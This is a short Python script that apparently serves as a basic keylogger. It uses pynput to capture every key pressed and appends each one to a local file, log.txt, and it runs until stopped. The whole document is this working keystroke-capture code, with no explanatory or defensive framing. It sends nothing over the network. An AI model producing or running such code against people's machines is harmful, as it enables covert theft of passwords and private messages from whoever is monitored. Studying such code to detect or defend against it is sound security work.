from pynput.keyboard import Listener

def key_logger(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")
    with open("log.txt", "a") as f:
        f.write(keydata)
        
with Listener(on_press=key_logger) as l:
    l.join()